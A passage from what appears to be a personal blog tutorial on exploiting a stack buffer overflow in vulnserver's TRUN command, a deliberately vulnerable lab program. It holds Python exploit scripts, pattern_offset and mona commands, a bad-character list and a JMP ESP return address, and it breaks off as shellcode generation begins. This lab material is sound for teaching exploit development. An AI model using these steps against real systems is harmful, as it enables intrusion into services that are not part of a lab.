offset = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em&quot;


try:
    s=socket.socket()
    s.connect((IP,port))
    s.send((trun.encode() +offset.encode()))
    s.close()

except:
    print(&quot;Error connecting to server&quot;)
    sys.exit()
    
</code></pre><p>When we check Immunity debugger, we should see a value at the EIP. This is the value we are interested in. In my case it is 386F4337 as can be seen below.
<img loading="lazy" src="/Screenshot%20from%202022-10-22%2013-14-25.png" alt=""  />
</p>
<p>We restart vulnserver and immunity debugger as administrator and reattach vulnserver to immunity debugger. we run immunity debugger, then in our Kali Linux Machine we run the following command and use the value that we obtained in the EIP in the command.
<code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3500 -q 386F4337</code> . We  should see an ouput like this in the Kali terminal.</p>
<p><img loading="lazy" src="/match.png" alt=""  />
</p>
<p>At 2003 bytes we can control the EIP.</p>
<ol start="3">
<li>Overwriting the EIP</li>
</ol>
<p>We are going to use the offset to overwrite the EIP. We will need to modify our python script to look like the code below</p>
<pre tabindex="0"><code class="language-{Python}" data-lang="{Python}">#! /usr/bin/python3

import socket, sys

IP = &quot;10.6.59.114&quot;
port =9999

trun = 'TRUN /.:/'
shellcode = &quot;A&quot; *2003 + &quot;B&quot; * 4

try:
    s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((IP,port))
    s.send((trun.encode()+shellcode.encode()))
    s.close()

except:
      print(&quot;Error while connecting&quot;)
      sys.exit()
</code></pre><p>We run the script.</p>
<p>Checking immunity debugger, we can see that we have successfully overwritten the EIP with 4Bs (42424242). This means we have controlled the EIP.
<img loading="lazy" src="/eip_control.png" alt=""  />
</p>
<ol start="4">
<li>Finding Bad Characters</li>
</ol>
<p>Finding bad characters is in relation to generating shellcode. When generating shellcode, we need to knpow which charaters are good for the shellcode and which ones are bad for the shellcode. We can do this by running all the hex characters through our program and seeing what characters act up. By default the null byte <code>x00</code> is a bad character for the shellcode. When we google badchars we can find this</p>
<pre tabindex="0"><code>
badchars = (
  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
) 

</code></pre><p>Then we edit our Python script to include the badchars variable. It should look like this:</p>
<pre tabindex="0"><code class="language-{Python}" data-lang="{Python}">#! /usr/bin/python3

import socket, sys

IP = &quot;10.6.59.114&quot;
port =9999

badchars = (
  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
) 
trun = 'TRUN /.:/'
shellcode = &quot;A&quot; *2003 + &quot;B&quot; * 4 

try:
    s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((IP,port))
    s.send((trun.encode()+shellcode.encode()))
    s.close()

except:
      print(&quot;Error while connecting&quot;)
      sys.exit()
</code></pre><p>When we run the script we see that we overwrite the EIP. What we are now looking out for is the Hex Dump. We want to find which characters in the Hex Dump are out of place. Heads up there are no bad characters in this but at times there are bad characters. But this is an eye test that you have to do when doing buffer overflows.</p>
<p><img loading="lazy" src="/badchars.png" alt=""  />
</p>
<ol start="5">
<li>Finding the Right Module</li>
</ol>
<p>When looking for the right module what we are looking for is a dll or something similar inside of our program that has no memory protection. Meaning no DEP,ASLR, SEH etc. There is a tool out there called <code>mona modules</code> that we can use with immunity debugger to achieve this. Make sure to place the <code>mona.py</code> file in this path (C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands) in the Windows machine. We want to find the opcode equivalent(converting Assembly Language to Hex Code) so we run this on the kali terminal. <code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</code></p>
<p>Run <code>JMP ESP</code>
<img loading="lazy" src="/assembly_to_hex.png" alt=""  />
</p>
<p>So the Hex Code equivalent of <code>JMP ESP</code> is <code>ffe4</code></p>
<p>We then go to Immunity and type this <code> !mona find -s &quot;\xff\xe4&quot; -m essfunc.dll</code> This gives us a return address. We enter the return address in little endian. This is because x86 stores the low order byte in low order address and the high order byte in high order address.</p>
<p>We then edit our Python script to look like this</p>
<pre tabindex="0"><code class="language-{Python}" data-lang="{Python}">#! /usr/bin/python3

import socket, sys

IP = &quot;10.6.59.114&quot;
port =9999
trun = 'TRUN /.:/'
shellcode = &quot;A&quot; *2003 + &quot;\xaf\x11\x50\x62&quot;
try:
    s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((IP,port))
    s.send((trun.encode()+shellcode.encode()))
    s.close()

except:
      print(&quot;Error while connecting&quot;)
      sys.exit()
</code></pre><p>This means that in the EIP, instead of having 4Bs, we are having a JMP code. This code is going to jump to some malicious code.</p>
<p>We then set a breakpoint so that when our program is executing and the buffer is overflown we stop at the EIP and wait for further instructions. We have no place we are jumping to for now.</p>
<p><img loading="lazy" src="/breakpoint.png" alt=""  />
</p>
<p>So we then execute our python script.</p>
<p><img loading="lazy" src="/control_eip.png" alt=""  />
</p>
<p>If we look at the registers now we see that we have successfully controlled the EIP.</p>
<ol start="6">
<li>Generating Shellcode and Gaining Shell</li>
</ol>
<p>We are going to use a tool known as <code>msfvenom</code></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="">John Munene</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
